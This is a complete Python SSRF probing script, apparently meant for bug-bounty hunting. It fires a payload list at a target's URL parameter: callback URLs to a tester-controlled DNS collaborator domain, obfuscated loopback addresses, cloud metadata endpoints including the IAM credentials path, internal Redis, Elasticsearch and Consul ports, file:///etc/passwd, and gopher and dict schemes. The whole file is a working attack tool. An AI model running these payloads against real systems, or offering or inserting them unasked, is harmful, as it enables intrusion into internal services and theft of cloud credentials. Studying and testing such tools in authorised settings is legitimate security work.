#!/usr/bin/env python3
"""SSRF payload set with DNS-callback verification.

    python3 ssrf_probe.py -u 'https://t/fetch?url=' --domain abc.oast.pro --tag r7
    python3 ssrf_probe.py -u 'https://t/fetch' -m POST --field url --domain abc.oast.pro

Verification: watch your collaborator/DNS log for the token subdomain. Every payload
carries a unique token so you know which one fired.
"""
import argparse, asyncio, secrets, sys
import aiohttp

PAYLOADS = [
    "http://{tok}.{d}/", "https://{tok}.{d}/", "//{tok}.{d}/", "{tok}.{d}",
    "http://{tok}.{d}:80/", "http://{tok}.{d}@127.0.0.1/",
    "http://127.0.0.1/", "http://127.0.0.1:80/", "http://127.1/", "http://0.0.0.0/",
    "http://[::1]/", "http://[::ffff:127.0.0.1]/", "http://0177.0.0.1/",
    "http://2130706433/", "http://0x7f000001/", "http://127.0.0.1.nip.io/",
    "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost:6379/", "http://localhost:9200/", "http://localhost:8500/v1/catalog/services",
    "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:11211/stats",
    "http://{tok}.{d}/%20", "http://{tok}.{d}/#@127.0.0.1/", "http://127.0.0.1%09/",
]

async def send(sess, args, payload, i):
    h = {"User-Agent": "Mozilla/5.0", "X-Hunt-Tag": f"{args.tag}-{i}"}
    try:
        if args.method == "GET":
            url = args.url + payload
            r = await sess.get(url, headers=h, ssl=False, timeout=aiohttp.ClientTimeout(total=12))
        else:
            data = {args.field: payload}
            r = await sess.request(args.method, args.url, data=data, headers=h, ssl=False,
                                   timeout=aiohttp.ClientTimeout(total=12))
        b = await r.read()
        print(f"{r.status}\t{len(b)}\t{payload}\t{b[:120].decode('utf8','replace').replace(chr(10),' ')}")
    except Exception as e:
        print(f"ERR\t0\t{payload}\t{type(e).__name__}")

async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-m", "--method", default="GET")
    ap.add_argument("--field", default="url")
    ap.add_argument("--domain", required=True, help="your collaborator/DNS zone")
    ap.add_argument("--tag", default="hunt")
    ap.add_argument("--rps", type=float, default=5)
    a = ap.parse_args()
    conn = aiohttp.TCPConnector(limit=5, ssl=False)
    async with aiohttp.ClientSession(connector=conn) as s:
        for i, p in enumerate(PAYLOADS):
            tok = secrets.token_hex(4)
            await send(s, a, p.format(tok=tok, d=a.domain), i)
            await asyncio.sleep(1 / a.rps)
    print("\nNow check your DNS log for the tokens above.", file=sys.stderr)

if __name__ == "__main__":
    asyncio.run(main())
